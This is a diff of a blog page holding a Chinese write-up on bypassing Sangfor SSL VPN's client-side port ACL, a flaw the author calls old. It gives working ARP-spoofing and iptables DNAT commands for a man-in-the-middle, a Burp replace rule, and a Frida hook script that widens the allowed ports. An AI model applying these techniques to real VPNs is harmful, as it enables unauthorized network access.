@@ -35,13 +35,13 @@
 <link rel="canonical" href="https://gorgias.me/2018/03/24/深信服-SSL-VPN-端口ACL-绕过实践/">
 
 
-<meta name="description" content="前言 首先声明此漏洞很老，修复的话只需升级到M7.5版本，前段时间无意间看到安全群有人聊到绕深信服SSL VPN的ACL，一直想实践一下，后来再网上只找到了这一篇两年前的参考资料看我如何利用burp大法绕过深信服SSL VPN访问权限控制，并且这个人的马赛克非常可怕，导致几乎信息量太少，看不懂他在说什么。 于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，替">
+<meta name="description" content="前言 首先声明此漏洞很老，修复的话只需升级到M7.5版本，前段时间无意间看到安全群有人聊到绕深信服SSL VPN的ACL，一直想实践一下，后来再网上只找到了这一篇两年前的参考资料看我如何利用burp大法绕过深信服SSL VPN访问权限控制，并且这个人的马赛克非常可怕，导致几乎信息量太少，看不懂他在说什么。 于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，">
 <meta name="keywords" content="深信服,SSL,VPN,bypass,绕过,中间人">
 <meta property="og:type" content="article">
 <meta property="og:title" content="深信服 SSL VPN 端口ACL 绕过实践">
 <meta property="og:url" content="https://gorgias.me/2018/03/24/深信服-SSL-VPN-端口ACL-绕过实践/index.html">
 <meta property="og:site_name" content="Gorgias&#39;Blog">
-<meta property="og:description" content="前言 首先声明此漏洞很老，修复的话只需升级到M7.5版本，前段时间无意间看到安全群有人聊到绕深信服SSL VPN的ACL，一直想实践一下，后来再网上只找到了这一篇两年前的参考资料看我如何利用burp大法绕过深信服SSL VPN访问权限控制，并且这个人的马赛克非常可怕，导致几乎信息量太少，看不懂他在说什么。 于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，替">
+<meta property="og:description" content="前言 首先声明此漏洞很老，修复的话只需升级到M7.5版本，前段时间无意间看到安全群有人聊到绕深信服SSL VPN的ACL，一直想实践一下，后来再网上只找到了这一篇两年前的参考资料看我如何利用burp大法绕过深信服SSL VPN访问权限控制，并且这个人的马赛克非常可怕，导致几乎信息量太少，看不懂他在说什么。 于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，">
 <meta property="og:locale" content="en-us">
 <meta property="og:image" content="https://gorgias.me/2018/03/24/深信服-SSL-VPN-端口ACL-绕过实践/invisible_proxying.png">
 <meta property="og:image" content="https://gorgias.me/2018/03/24/深信服-SSL-VPN-端口ACL-绕过实践/bettercap.png">
@@ -57,7 +57,7 @@
 <meta property="og:updated_time" content="2018-04-01T11:38:14.247Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="深信服 SSL VPN 端口ACL 绕过实践">
-<meta name="twitter:description" content="前言 首先声明此漏洞很老，修复的话只需升级到M7.5版本，前段时间无意间看到安全群有人聊到绕深信服SSL VPN的ACL，一直想实践一下，后来再网上只找到了这一篇两年前的参考资料看我如何利用burp大法绕过深信服SSL VPN访问权限控制，并且这个人的马赛克非常可怕，导致几乎信息量太少，看不懂他在说什么。 于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，替">
+<meta name="twitter:description" content="前言 首先声明此漏洞很老，修复的话只需升级到M7.5版本，前段时间无意间看到安全群有人聊到绕深信服SSL VPN的ACL，一直想实践一下，后来再网上只找到了这一篇两年前的参考资料看我如何利用burp大法绕过深信服SSL VPN访问权限控制，并且这个人的马赛克非常可怕，导致几乎信息量太少，看不懂他在说什么。 于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，">
 <meta name="twitter:image" content="https://gorgias.me/2018/03/24/深信服-SSL-VPN-端口ACL-绕过实践/invisible_proxying.png">
 
 
@@ -162,33 +162,33 @@
 
     
             <div class="post-content">
-            <h2>前言</h2>
+            <h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
 <p>首先声明此漏洞很老，修复的话只需升级到M7.5版本，前段时间无意间看到安全群有人聊到绕深信服SSL VPN的ACL，一直想实践一下，后来再网上只找到了这一篇两年前的参考资料<a href="https://www.secpulse.com/archives/50144.html" target="_blank" rel="noopener">看我如何利用burp大法绕过深信服SSL VPN访问权限控制</a>，并且这个人的马赛克非常可怕，导致几乎信息量太少，看不懂他在说什么。</p>
-<p>于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，替换端口范围，客户端对端口进行访问控制，服务端对IP访问控制。
+<p>于是我花时间研究了一下，其实没有他说的那么复杂，就是中间人攻击：服务端返回ACL列表之后，替换端口范围，客户端对端口进行访问控制，服务端对IP访问控制。<br>
 这个漏洞提交者提出了能否绕IP的问题，但是这部分没验证也没有解释，评论都是一片膜拜，导致我以为能绕IP访问控制。</p>
 <p>还可以Hook客户端来绕过端口的访问控制，不过这样也挺麻烦。虽然是很简单的东西，但是通过实践，学到了一些技巧，记录下来。</p>
-<h2>网络层</h2>
+<h2 id="网络层"><a class="markdownIt-Anchor" href="#网络层"></a> 网络层</h2>
 <p>我尝试了三个方法，都需要用到BurpSuite。既然属于中间人攻击，那么Burp就要开启透明代理了。</p>
 <p><img src="invisible_proxying.png" alt="invisible_proxying"></p>
-<h3>方法1：Bettercap</h3>
+<h3 id="方法1bettercap"><a class="markdownIt-Anchor" href="#方法1bettercap"></a> 方法1：Bettercap</h3>
 <p>Bettercap是实战用的中间人攻击工具，但是在白盒实践中最不稳定。</p>
 <ul>
 <li>客户端主机 Sangfor SSL VPN</li>
 <li>中间人主机 Bettercap + Burp Suite</li>
 </ul>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port 8080</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port 8080</span><br></pre></td></tr></table></figure>
 <p>首先VPN服务器端口是443，因此需要把端口443重定向到Burp的8080，当然使用root权限运行Burp可以监听443端口，这样就不用重定向端口了。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port 8080 --custom-https-proxy burp_suite_ip --custom-https-proxy-port 8080 --custom-redirection <span class="string">"TCP 443 8080"</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port 8080 --custom-https-proxy burp_suite_ip --custom-https-proxy-port 8080 --custom-redirection <span class="string">"TCP 443 8080"</span></span><br></pre></td></tr></table></figure>
 <p><img src="bettercap.png" alt="bettercap"></p>
-<h3>方法2：hosts</h3>
+<h3 id="方法2hosts"><a class="markdownIt-Anchor" href="#方法2hosts"></a> 方法2：hosts</h3>
 <p>环境如下:</p>
 <ul>
 <li>客户端主机 Sangfor SSL VPN</li>
 <li>中间人主机 Bettercap + Burp Suite</li>
 </ul>
 <p>也可以直接修改hosts，但是Burp的监听端口要与VPN端口一致。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"target_ip vpn.test.com"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure></p>
-<h3>方法3：Destnation NAT</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"target_ip vpn.test.com"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<h3 id="方法3destnation-nat"><a class="markdownIt-Anchor" href="#方法3destnation-nat"></a> 方法3：Destnation NAT</h3>
 <p>这种方法最稳定，应用场景很多，而且适用于客户端主机无法使用本地代理的场景：</p>
 <ol>
 <li>客户端检测并不允许系统代理。</li>
@@ -200,43 +200,43 @@
 <li>中间人主机 Burp Suite</li>
 <li>中间人网关机 iptables</li>
 </ul>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启IPv4内核转发</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -X</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -t mangle -X</span><br><span class="line">iptables -t raw -F</span><br><span class="line">iptables -t raw -X</span><br><span class="line">iptables -t security -F</span><br><span class="line">iptables -t security -X</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"><span class="comment"># 假设客户端主机网段是192.168.1.0/24，客户端主机通过中间人网关机的eth0上网</span></span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE</span><br><span class="line"><span class="comment"># 当访问VPN服务器的地址vpn_server_ip:443时，目标地址转换成burp_suite_ip:8080</span></span><br><span class="line">iptables -t nat -A PREROUTING -d vpn_server_ip -p tcp --dport 443 -j DNAT --to-destination burp_suite_ip.:8080</span><br></pre></td></tr></table></figure></p>
-<h3>后续操作</h3>
-<p>首先，设置Burp的替换规则。
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启IPv4内核转发</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -X</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -t mangle -X</span><br><span class="line">iptables -t raw -F</span><br><span class="line">iptables -t raw -X</span><br><span class="line">iptables -t security -F</span><br><span class="line">iptables -t security -X</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"><span class="comment"># 假设客户端主机网段是192.168.1.0/24，客户端主机通过中间人网关机的eth0上网</span></span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE</span><br><span class="line"><span class="comment"># 当访问VPN服务器的地址vpn_server_ip:443时，目标地址转换成burp_suite_ip:8080</span></span><br><span class="line">iptables -t nat -A PREROUTING -d vpn_server_ip -p tcp --dport 443 -j DNAT --to-destination burp_suite_ip.:8080</span><br></pre></td></tr></table></figure>
+<h3 id="后续操作"><a class="markdownIt-Anchor" href="#后续操作"></a> 后续操作</h3>
+<p>首先，设置Burp的替换规则。<br>
 <img src="replace_rule.png" alt="replace_rule"></p>
 <p>其次，开始登录VPN。</p>
 <p><img src="target_request.png" alt="target_request"></p>
-<p>当/por/rclist.csp请求完毕，马上取消Burp代理，否则会导致访问太慢VPN断开，取消Burp代理依然能够保持网络链接。
+<p>当/por/rclist.csp请求完毕，马上取消Burp代理，否则会导致访问太慢VPN断开，取消Burp代理依然能够保持网络链接。<br>
 这一点上方法3最方便，不需要在客户端主机操作，方法2比较麻烦，方法1很大可能有延迟。</p>
 <p><img src="DNAT.png" alt="DNAT"></p>
 <p>这时候客户端接收到的ACL表的端口范围已经被篡改。</p>
 <p><img src="malicious_acl.png" alt="malicious_acl"></p>
 <p>首先查看NAT表的PREROUTING链号码是1。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; iptables -t nat -L --line-number</span><br><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">num  target     prot opt <span class="built_in">source</span>               destination</span><br><span class="line">1    DNAT       tcp  --  anywhere             vpn_server_ip         tcp dpt:https to:burp_suite_ip:8080</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; iptables -t nat -L --line-number</span><br><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">num  target     prot opt <span class="built_in">source</span>               destination</span><br><span class="line">1    DNAT       tcp  --  anywhere             vpn_server_ip         tcp dpt:https to:burp_suite_ip:8080</span><br></pre></td></tr></table></figure>
 <p>将其删去，就能绕过客户端的端口ACL了。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -D PREROUTING 1</span><br></pre></td></tr></table></figure></p>
-<h2>应用层</h2>
-<p>这里只实践安卓平台的，没有加固，比较方便。
-首先用jadx打开easyconnect，然后找到&quot;rclist.csp&quot;的关键字。
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -D PREROUTING 1</span><br></pre></td></tr></table></figure>
+<h2 id="应用层"><a class="markdownIt-Anchor" href="#应用层"></a> 应用层</h2>
+<p>这里只实践安卓平台的，没有加固，比较方便。<br>
+首先用jadx打开easyconnect，然后找到&quot;rclist.csp&quot;的关键字。<br>
 <img src="keywords.png" alt="keywords"></p>
-<p>一路跟过去，找到适合Hook服务端返回结果的位置。
-<img src="code1.png" alt="code1">
+<p>一路跟过去，找到适合Hook服务端返回结果的位置。<br>
+<img src="code1.png" alt="code1"><br>
 <img src="code2.png" alt="code2"></p>
 <p>然后编写Hook脚本，把端口范围设置成最大，保存为2.js。</p>
-<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookIt</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> rclist=Java.use(<span class="string">"com.sangfor.vpn.client.service.d.a"</span>);</span><br><span class="line">    rclist.a.overload(<span class="string">'java.lang.String'</span>).implementation=replacePorts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replacePorts</span>(<span class="params">str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    str = str.replace(<span class="regexp">/port="[^\"]+"/g</span>, <span class="string">'port="1~65535"'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"str replaced: "</span> + str);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.a(str);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Java.perform(hookIt);</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookIt</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> rclist=Java.use(<span class="string">"com.sangfor.vpn.client.service.d.a"</span>);</span><br><span class="line">    rclist.a.overload(<span class="string">'java.lang.String'</span>).implementation=replacePorts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replacePorts</span>(<span class="params">str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    str = str.replace(<span class="regexp">/port="[^\"]+"/g</span>, <span class="string">'port="1~65535"'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"str replaced: "</span> + str);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.a(str);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Java.perform(hookIt);</span><br></pre></td></tr></table></figure>
 <p>我的安卓设备是64位的，有root权限，通过adb开启Frida服务</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-10.7.6-android-arm64 /data/<span class="built_in">local</span>/tmp/</span><br><span class="line">adb shell chmod 755 /data/<span class="built_in">local</span>/tmp/frida-server-10.7.6-android-arm64</span><br><span class="line">adb shell su -c /data/<span class="built_in">local</span>/tmp/frida-server-10.7.6-android-arm64</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-10.7.6-android-arm64 /data/<span class="built_in">local</span>/tmp/</span><br><span class="line">adb shell chmod 755 /data/<span class="built_in">local</span>/tmp/frida-server-10.7.6-android-arm64</span><br><span class="line">adb shell su -c /data/<span class="built_in">local</span>/tmp/frida-server-10.7.6-android-arm64</span><br></pre></td></tr></table></figure>
 <p>使用frida-ps找到Easyconnect的进程名</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -aU | grep sangfor</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -aU | grep sangfor</span><br></pre></td></tr></table></figure>
 <p><img src="ps.png" alt="ps"></p>
 <p>运行Frida，制定Hook脚本和进程名</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l 2.js com.sangfor.vpn.client.phone</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l 2.js com.sangfor.vpn.client.phone</span><br></pre></td></tr></table></figure>
 <p><img src="frida.png" alt="frida"></p>
 <p>可以看到端口范围已经被修改。</p>
 <p>以上步骤在实战中都很繁琐，其实可以通过深信服SSL VPN的SDK来开发一个无限制版，不过也太麻烦了，只是绕个端口而已，还不去多撸几台服务器直接打入内网。</p>
-<h2>Reference</h2>
-<p><a href="https://www.frida.re/docs/home/" target="_blank" rel="noopener">Frida Docs</a>
-<a href="https://linux.die.net/man/8/iptables" target="_blank" rel="noopener">iptables</a>
+<h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h2>
+<p><a href="https://www.frida.re/docs/home/" target="_blank" rel="noopener">Frida Docs</a><br>
+<a href="https://linux.die.net/man/8/iptables" target="_blank" rel="noopener">iptables</a><br>
 <a href="https://www.bettercap.org/" target="_blank" rel="noopener">Bettercap</a></p>
 
             </div>
@@ -311,7 +311,7 @@
     
         2015 -
     
-    2023
+    2024
     <span class="footer-author">Gorgias.  <a href="https://gorgias.me/atom.xml">[RSS]</a></span>
     <span class="power-by">
         Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
